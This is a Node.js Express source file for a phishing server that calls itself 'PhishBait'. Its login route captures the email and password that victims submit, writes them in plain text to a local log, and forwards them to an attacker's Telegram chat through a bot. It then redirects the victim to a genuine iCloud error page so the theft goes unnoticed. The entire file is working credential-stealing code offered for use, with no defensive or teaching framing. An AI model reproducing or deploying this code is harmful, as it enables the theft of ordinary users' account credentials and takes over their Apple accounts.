require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

// Configuration Telegram
const bot = new TelegramBot(process.env.TELEGRAM_TOKEN, {polling: true});
const CHAT_ID = process.env.CHAT_ID;

// Route de capture
app.post('/login', (req, res) => {
  const {email, password} = req.body;
  const logEntry = `[${new Date().toISOString()}] Email: ${email} | Password: ${password}\n`;
  
  // Log local
  fs.appendFileSync('credentials.log', logEntry);
  
  // Notification Telegram
  if(process.env.TELEGRAM_ENABLED === 'true') {
    bot.sendMessage(CHAT_ID, `🔔 New Credentials:\n${logEntry}`);
  }
  
  // Redirection réaliste
  res.redirect('https://icloud.com/auth/error?reason=invalid_credentials');
});

app.listen(3001, () => console.log('PhishBait server running on port 3001'));
